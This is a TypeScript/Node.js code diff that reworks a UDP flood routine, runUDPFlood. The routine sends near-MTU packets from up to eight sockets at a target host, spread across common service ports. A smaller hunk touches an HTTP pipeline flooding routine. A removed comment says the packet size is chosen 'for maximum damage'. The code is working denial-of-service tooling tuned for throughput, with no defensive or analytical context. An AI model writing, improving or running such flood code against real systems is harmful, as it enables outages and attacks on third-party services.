@@ -136,55 +136,74 @@ async function runUDPFlood(
   signal: AbortSignal,
   onStats: (p: number, b: number) => void,
 ): Promise<void> {
-  // Multiple UDP sockets for higher throughput (bypass per-socket kernel limits)
-  const numSockets = Math.min(threads, 16);
-  const sockets = Array.from({length: numSockets}, () => {
-    const s = dgram.createSocket("udp4");
-    s.unref(); // don't keep process alive
-    s.on("error", () => {}); // absorb ICMP unreachable + port errors
-    return s;
-  });
-
+  // Scale sockets within 1 worker — up to 8 sockets.
+  // CRITICAL: concurrent socket.send() startup deadlocks in this environment.
+  // Sockets must be bound and started SEQUENTIALLY, then all run in parallel.
+  const numSockets = Math.max(1, Math.min(threads, 8));
   const PORTS = [targetPort, 53, 80, 443, 123, 161, 1900, 11211];
-  const PKT_MIN = 512, PKT_MAX = 1472; // near MTU for maximum damage
+  const PKT_MIN = 512, PKT_MAX = 1472;
 
   let localPkts = 0, localBytes = 0;
   const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
-  // UDP launcher — callback-based for backpressure; each cb fires when kernel queued
-  const MAX_INFLIGHT_UDP = 200; // per socket
-  const udpLauncher = (sock: dgram.Socket): Promise<void> => new Promise<void>((resolve) => {
-    let inflight = 0;
+  const MAX_INFLIGHT = 100; // per socket
 
-    const sendNext = () => {
-      if (signal.aborted) {
-        if (inflight === 0) { try { sock.close(); } catch { /**/ } resolve(); }
-        return;
-      }
-      while (inflight < MAX_INFLIGHT_UDP && !signal.aborted) {
-        const port   = PORTS[Math.floor(Math.random() * PORTS.length)];
-        const pktLen = randInt(PKT_MIN, PKT_MAX);
-        const buf    = Buffer.allocUnsafe(pktLen);
-        buf.fill(0xDE); buf.writeUInt32BE(Date.now() >>> 0, 0);
-        inflight++;
-        sock.send(buf, 0, pktLen, port, resolvedHost, (_err) => {
-          inflight--;
-          localPkts++;
-          localBytes += pktLen;
+  // Collect per-socket done promises
+  const socketDonePromises: Promise<void>[] = [];
+
+  // Start each socket SEQUENTIALLY (bind → sendNext → start next socket)
+  for (let _s = 0; _s < numSockets; _s++) {
+    await new Promise<void>((bindReady) => {
+      const socketDone = new Promise<void>((resolve) => {
+        const sock = dgram.createSocket("udp4");
+        sock.on("error", () => {}); // absorb all errors
+
+        let inflight = 0;
+        let closed = false;
+
+        const forceClose = () => {
+          if (!closed) {
+            closed = true;
+            try { sock.close(); } catch { /**/ }
+            resolve();
+          }
+        };
+
+        const sendNext = () => {
+          if (closed) return;
+          if (signal.aborted && inflight === 0) { forceClose(); return; }
+          while (!closed && !signal.aborted && inflight < MAX_INFLIGHT) {
+            const port   = PORTS[randInt(0, PORTS.length)];
+            const pktLen = randInt(PKT_MIN, PKT_MAX);
+            const buf    = Buffer.allocUnsafe(pktLen);
+            buf.writeUInt32BE(Date.now() >>> 0, 0);
+            inflight++;
+            sock.send(buf, 0, pktLen, port, resolvedHost, (_err) => {
+              inflight--;
+              localPkts++;
+              localBytes += pktLen;
+              sendNext();
+            });
+          }
+        };
+
+        signal.addEventListener("abort", () => {
+          setTimeout(forceClose, 300);
+        }, { once: true });
+
+        // Bind first so ephemeral port is assigned, then start flood
+        sock.bind(0, () => {
           sendNext();
+          bindReady(); // allow loop to continue to next socket
         });
-      }
-    };
+      });
 
-    signal.addEventListener("abort", () => {
-      if (inflight === 0) { try { sock.close(); } catch { /**/ } resolve(); }
-    }, { once: true });
+      socketDonePromises.push(socketDone);
+    });
+  }
 
-    sendNext();
-  });
-
-  await Promise.all(sockets.map(s => udpLauncher(s)));
+  await Promise.all(socketDonePromises);
   clearInterval(flushIv);
   flush();
 }
@@ -349,7 +368,8 @@ async function runHTTPPipeline(
         ok = sock.write(buf);
         if (!ok) break; // hit backpressure — wait for drain
       }
-      // setTimeout(0) gives the timer phase (setInterval/flush) a chance to run
+      // setTimeout(0) yields to the timer phase every tick, keeping
+      // the event loop responsive (setInterval flush runs correctly)
       if (ok) setTimeout(pump, 0);
       else sock.once("drain", pump);
     };
